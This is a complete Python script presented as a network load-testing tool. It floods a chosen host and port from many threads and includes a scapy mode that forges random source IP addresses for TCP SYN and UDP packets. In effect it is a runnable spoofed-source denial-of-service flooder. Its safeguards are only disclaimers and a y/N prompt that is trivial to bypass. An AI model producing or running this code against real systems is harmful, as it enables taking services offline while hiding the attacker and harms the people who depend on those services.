#!/usr/bin/env python3
"""
Network Load Testing Tool with IP Spoofing
For authorized testing of your own networks and systems only.
"""

import argparse
import socket
import threading
import time
import random
import sys
import logging
import struct
import os
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, UDP, Ether, RandIP, Raw, send

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class NetworkLoadTester:
    def __init__(self, target, port, duration=60, threads=10, 
                 packet_size=1024, protocol='TCP', interval=0.01,
                 spoof_ip=False, ip_range=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.packet_size = packet_size
        self.protocol = protocol.upper()
        self.interval = interval
        self.spoof_ip = spoof_ip
        self.ip_range = ip_range
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        self.start_time = 0
        
        # Validate inputs
        if self.protocol not in ['TCP', 'UDP']:
            raise ValueError("Protocol must be either TCP or UDP")
        
        # Check for admin privileges on Windows or root on Unix
        if self.spoof_ip:
            if sys.platform.startswith('win'):
                # On Windows, check if running as admin (can't use os.geteuid)
                try:
                    import ctypes
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if not is_admin:
                        raise PermissionError("IP spoofing requires administrator privileges")
                except Exception:
                    logger.warning("Could not check for admin privileges")
            else:
                # On Unix systems
                if os.geteuid() != 0:
                    raise PermissionError("IP spoofing requires root privileges")
    
    def generate_payload(self):
        """Generate random payload data for packets"""
        return random.randbytes(self.packet_size)
    
    def get_spoofed_ip(self):
        """Generate a spoofed source IP address"""
        if self.ip_range:
            # Use specified IP range if provided
            start_ip, end_ip = self.ip_range.split('-')
            start = struct.unpack('>I', socket.inet_aton(start_ip))[0]
            end = struct.unpack('>I', socket.inet_aton(end_ip))[0]
            ip_int = random.randint(start, end)
            return socket.inet_ntoa(struct.pack('>I', ip_int))
        else:
            # Generate a random IP address
            return RandIP()._fix()
    
    def tcp_worker(self):
        """TCP worker with optional IP spoofing"""
        payload = self.generate_payload()
        
        if not self.spoof_ip:
            # Regular TCP connection
            while not self.stop_event.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    
                    # Send data
                    sock.send(payload)
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(payload)
                    
                    sock.close()
                    time.sleep(self.interval)
                    
                except socket.error:
                    # Connection failed, retry
                    time.sleep(0.1)
                except Exception as e:
                    logger.error(f"TCP worker error: {str(e)}")
        else:
            # Scapy-based TCP with IP spoofing
            while not self.stop_event.is_set():
                try:
                    src_ip = self.get_spoofed_ip()
                    src_port = random.randint(1025, 65535)
                    
                    # Craft packet
                    packet = IP(src=src_ip, dst=self.target)/TCP(
                        sport=src_port, 
                        dport=self.port, 
                        flags="S"
                    )/Raw(load=payload)
                    
                    # Send packet
                    send(packet, verbose=0)
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(payload)
                    
                    time.sleep(self.interval)
                    
                except Exception as e:
                    logger.error(f"TCP spoof worker error: {str(e)}")
    
    def udp_worker(self):
        """UDP worker with optional IP spoofing"""
        payload = self.generate_payload()
        
        if not self.spoof_ip:
            # Regular UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while not self.stop_event.is_set():
                try:
                    sock.sendto(payload, (self.target, self.port))
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(payload)
                    
                    time.sleep(self.interval)
                    
                except Exception as e:
                    logger.error(f"UDP worker error: {str(e)}")
        else:
            # Scapy-based UDP with IP spoofing
            while not self.stop_event.is_set():
                try:
                    src_ip = self.get_spoofed_ip()
                    src_port = random.randint(1025, 65535)
                    
                    # Craft packet
                    packet = IP(src=src_ip, dst=self.target)/UDP(
                        sport=src_port, 
                        dport=self.port
                    )/Raw(load=payload)
                    
                    # Send packet
                    send(packet, verbose=0)
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(payload)
                    
                    time.sleep(self.interval)
                    
                except Exception as e:
                    logger.error(f"UDP spoof worker error: {str(e)}")
    
    def status_reporter(self):
        """Reports statistics during the test"""
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                with self.lock:
                    pps = self.packets_sent / elapsed
                    bps = self.bytes_sent / elapsed
                
                logger.info(f"Running for {elapsed:.2f}s | "
                           f"Sent: {self.packets_sent} packets | "
                           f"Rate: {pps:.2f} packets/sec | "
                           f"Bandwidth: {bps/1024/1024:.2f} MB/s")
            
            time.sleep(1)
    
    def run(self):
        """Run the load test"""
        logger.info(f"Starting load test against {self.target}:{self.port} "
                   f"({self.protocol}) for {self.duration} seconds")
        logger.info(f"Using {self.threads} threads with {self.packet_size} byte packets")
        
        if self.spoof_ip:
            logger.info(f"IP spoofing enabled: {self.ip_range if self.ip_range else 'random IPs'}")
        
        # Confirm before running
        print("\nWARNING: This tool should only be used for authorized testing")
        print("IP spoofing for malicious purposes is illegal in most jurisdictions")
        if input("I confirm I have permission to test this target (y/N): ").lower() != 'y':
            logger.info("Test aborted by user")
            return
        
        self.start_time = time.time()
        
        # Start status reporter
        reporter_thread = threading.Thread(target=self.status_reporter)
        reporter_thread.daemon = True
        reporter_thread.start()
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            worker_func = self.tcp_worker if self.protocol == 'TCP' else self.udp_worker
            futures = [executor.submit(worker_func) for _ in range(self.threads)]
            
            try:
                # Run for specified duration
                time.sleep(self.duration)
                self.stop_event.set()
                
                # Wait for tasks to complete
                for future in futures:
                    future.result(timeout=1)
                
            except KeyboardInterrupt:
                logger.info("Test interrupted by user")
                self.stop_event.set()
        
        # Final report
        elapsed = time.time() - self.start_time
        logger.info(f"\nTest completed. Duration: {elapsed:.2f} seconds")
        logger.info(f"Total packets sent: {self.packets_sent}")
        logger.info(f"Total data sent: {self.bytes_sent/1024/1024:.2f} MB")
        if elapsed > 0:
            logger.info(f"Average rate: {self.packets_sent/elapsed:.2f} packets/sec")
            logger.info(f"Average bandwidth: {self.bytes_sent/elapsed/1024/1024:.2f} MB/s")


def main():
    parser = argparse.ArgumentParser(
        description="Network Load Testing Tool - For authorized testing only",
        epilog="This tool should only be used for legitimate testing of your own infrastructure"
    )
    parser.add_argument("target", help="Target hostname or IP address")
    parser.add_argument("port", type=int, help="Target port number")
    parser.add_argument("-d", "--duration", type=int, default=60,
                        help="Test duration in seconds (default: 60)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of worker threads (default: 10)")
    parser.add_argument("-p", "--protocol", choices=["tcp", "udp"], default="tcp",
                        help="Protocol to use (tcp or udp, default: tcp)")
    parser.add_argument("-s", "--packet-size", type=int, default=1024,
                        help="Size of packets in bytes (default: 1024)")
    parser.add_argument("-i", "--interval", type=float, default=0.01,
                        help="Interval between packets in seconds (default: 0.01)")
    parser.add_argument("--spoof", action="store_true",
                        help="Enable IP spoofing (requires admin privileges)")
    parser.add_argument("--ip-range", type=str,
                        help="IP range for spoofing (format: 192.168.1.1-192.168.1.254)")
    
    args = parser.parse_args()
    
    print("DISCLAIMER:")
    print("This tool is for authorized testing of your own systems only.")
    print("Unauthorized use against systems you don't own is illegal.")
    print("IP spoofing may be illegal in your jurisdiction if used maliciously.")
    print("Ensure you have proper permission before running load tests.")
    print("")
    
    try:
        tester = NetworkLoadTester(
            target=args.target,
            port=args.port,
            duration=args.duration,
            threads=args.threads,
            packet_size=args.packet_size,
            protocol=args.protocol,
            interval=args.interval,
            spoof_ip=args.spoof,
            ip_range=args.ip_range
        )
        tester.run()
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
